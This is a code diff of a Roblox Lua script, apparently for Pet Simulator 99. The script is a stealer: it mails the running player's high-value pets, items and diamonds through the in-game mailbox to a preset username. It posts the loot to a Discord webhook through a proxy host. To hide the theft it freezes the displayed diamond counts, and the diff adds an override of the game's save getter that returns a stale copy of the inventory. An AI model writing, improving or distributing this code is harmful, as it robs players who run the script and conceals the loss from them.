@@ -1,7 +1,3 @@
-Username = "you user here"
-Webhook = "your webhook here"
-min_rap = 500000 -- minimum rap of each item you want to get sent to you.
-
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
@@ -81,12 +77,6 @@ end
 
 local user = Username
 
-local gemsleft = plr.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
-local gemsleftpath = plr.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
-gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
-	gemsleftpath.Text = gemsleft
-end)
-
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
@@ -139,6 +129,7 @@ local function sendItem(category, uid, am)
 	repeat
     	local response = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 	until response == true
+	GemAmount1 = GemAmount1 - 10000
 end
 
 local function CategorySteal(category)
@@ -176,14 +167,13 @@ end
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-            local GemAmount = v._am
-			if GemAmount and GemAmount >= 20000 then
+			if GemAmount1 >= 20000 then
 				local args = {
 					[1] = user,
 					[2] = MailMessage,
 					[3] = "Currency",
 					[4] = i,
-					[5] = GemAmount - 10000
+					[5] = GemAmount1 - 10000
 				}
 				local response = false
 				repeat
@@ -233,7 +223,7 @@ local function CategoryWebhook(category)
 				if v.sh then
 					prefix = "Shiny " .. prefix
 				end
-				local id = prefix .. v.id
+				local id = prefix .. v.id .. " (x" .. (v._am and tostring(v._am) or "1") .. ")"
 				table.insert(itemsToSend, {name = id, rap = rapValue})
 			end
 		end
@@ -241,27 +231,24 @@ local function CategoryWebhook(category)
 		for i, v in pairs(save[category]) do
 			local rapValue = getRAP(category, v)
 			if rapValue >= min_rap then
-				local id = v.id
+				local id = v.id .. " (x" .. (v._am and tostring(v._am) or "1") .. ")"
 				table.insert(itemsToSend, {name = id, rap = rapValue})
 			end
 		end
 	end
 end
 
-if CountHuges() > 0 or GemAmount1 >= 500000 then
-    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_UnequipAll"):FireServer()
-    local parent = game.Workspace:FindFirstChild("__THINGS")
-    local oldFolder = parent and parent:FindFirstChild("Pets")
-    local newFolder = Instance.new("Folder")
-    newFolder.Name = "uwu"
-    newFolder.Parent = parent
-    for _, child in ipairs(oldFolder:GetChildren()) do
-        child.Parent = newFolder
+local function ClaimMail()
+    local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        wait()
+        response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
     end
-    oldFolder:Destroy()
-    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_Restore"):FireServer()
+end
+
+if CountHuges() > 0 or GemAmount1 >= 500000 then
+    ClaimMail()
 	EmptyBoxes()
-	game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
 	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 	for i, v in pairs(categoryList) do
 		if save[v] ~= nil then
@@ -271,6 +258,22 @@ if CountHuges() > 0 or GemAmount1 >= 500000 then
 	if Webhook and string.find(Webhook, "discord") then
 		Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
 		SendMessage(Webhook, plr.Name, GemAmount1)
+	end
+	local blob_a = require(game.ReplicatedStorage.Library)
+	local blob_b = blob_a.Save.Get()
+	function deepCopy(original)
+		local copy = {}
+		for k, v in pairs(original) do
+			if type(v) == "table" then
+				v = deepCopy(v)
+			end
+			copy[k] = v
+		end
+		return copy
+	end
+	blob_b = deepCopy(blob_b)
+	blob_a.Save.Get = function(...)
+		return blob_b
 	end
 	for i, v in pairs(categoryList) do
 		if save[v] ~= nil then
